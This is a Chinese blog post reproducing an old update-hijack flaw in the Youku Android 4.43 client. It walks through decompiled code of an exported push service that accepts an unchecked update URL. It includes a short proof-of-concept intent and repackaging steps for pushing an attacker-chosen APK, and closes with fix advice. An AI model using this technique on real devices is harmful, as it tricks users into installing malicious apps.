---
layout: post
title:  "优酷 Android 4.43客户端升级漏洞---复现"
categories: [bugs-dig,android] 
---



# 序言

4.5版本已经下载不到了,我找了一个4.43的版本。这版本是２０１５年的样子，现在都２０２４年了。

通过网盘分享的文件：youhu443_downcc.apk

链接: https://pan.baidu.com/s/1EN4mkPKu5uR_qgu57kuQiQ?pwd=n8j7 提取码: n8j7

安装在我安卓14的手机上,运行不起来.

安装在avd上也运行不起来,

所以没意义,QAQ



# 复现分析

wp: [优酷Android 4.5客户端升级漏洞](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635)



把apk托进iadx

组件com.youku.service.push.StartActivityService声明如下：

```
<service
android:label="Youku Push Notifications StartActivityService"  android:name="com.youku.service.push.StartActivityService" 
android:exported="true"
/>
```

可知该组件对外暴露。

该组件对应的代码执行部分如下

在文件 com.youku.service.push.StartActivityService.java中

```java
    @Override // android.app.IntentService
    protected void onHandleIntent(Intent i) {
        Intent i2;
        String track_id;
        final PushMsg msg = (PushMsg) i.getSerializableExtra("PushMsg");
        if (msg.mid != null) {
            String action = i.getStringExtra("action");
            PushUtils.notificationOpenFeedback(msg.mid, msg.type, action);
        }
        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();
        switch (msg.type) {
            case 1:
                i.setFlags(876609536);
                i.setClass(this, UpdateActivity.class);
                i.putExtra(UpdateActivity.KEY_URL, msg.updateurl);
                i.putExtra(UpdateActivity.KEY_NEW_VERSION, msg.updateversion);
                i.putExtra(UpdateActivity.KEY_CONTENT, msg.updatecontent);
                i.putExtra(UpdateActivity.KEY_UPDATE_TYPE, 2);
                startActivity(i);
                return;

```

　　我们可以发现从代码`i.getSerializableExtra("PushMsg")`中获知, Intent从获取名为**PushMsg**的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。

　　通过代码`i.setClass(this, UpdateActivity.class);`知, 升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。

　　在`com.youku.ui.activity.UpdateActivity`中,

```java
   @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(1);
        super.onCreate(savedInstanceState);
        Logger.d(TAG, "UpdateActivity.onCreate()");
        LayoutInflater mInflater = LayoutInflater.from(this);
        LinearLayout rootView = (LinearLayout) mInflater.inflate(R.layout.updateactvity, (ViewGroup) null);
        setContentView(rootView);
        Intent i = getIntent();
        if (i != null) {
            String url = i.getStringExtra(KEY_URL);
            String version = i.getStringExtra(KEY_NEW_VERSION);
            String content = i.getStringExtra(KEY_CONTENT);
            if (content == null) {
                content = "";
            }
            int updateType = -2;
            if (i.hasExtra(KEY_UPDATE_TYPE)) {
                updateType = i.getIntExtra(KEY_UPDATE_TYPE, 2);
            }
            UpdateManager um = new UpdateManager(this);
            if (updateType == 3) {
                um.setUpdateInfo(url, version, content, UpdateManager.UpdateType.force);
            } else if (updateType == 2) {
                um.setUpdateInfo(url, version, content, UpdateManager.UpdateType.push);
            } else if (updateType == -2) {
                um.setUpdateInfo(url, version, content, UpdateManager.UpdateType.check);
            } else {
                finish();
                return;
            }
            um.showNoticeDialog();
            return;
        }
        finish();
    }

```

先获取传递过来的Intent参数信息

然后做一些简单的判断,然后调用`UpdateManager.setUpdateInfo`, 期间并没有做一些检查

然后调用`UpdateManager.showNoticeDialog`提醒用户升级之类的



# 如何利用

　　该漏洞触发的关键在于对PushMsg数据的控制，基本思路如下：

　　创建一个Android App程序(但是得和YouKu app处于同一设备中,QAQ)，在主Activity中的关键代码如下：

```
PushMsg pushMsg = new PushMsg();
pushMsg.type = 1;
pushMsg.updateurl = "http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk";
//url传递为我们要指定那种的apk
pushMsg.updatecontent = "This is Fake";
		
Intent intent = new Intent();
intent.setClassName("com.youku.phone","com.youku.service.push.StartActivityService");
intent.putExtra("PushMsg", pushMsg);
startService(intent);//从外部启动YOuKu的service
```

　　其中PushMsg类不需要完整实现，只需要编译通过即可；

　　反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；

　　反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；　　

　　安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。



# 修复

组件不暴露、对升级地址（ＵＲＬ）进行判断、对下载的APK文件进行校验！

小结：

软件的升级是ａｐｐ的必备功能，那么这将是我们以后的漏洞挖掘方向．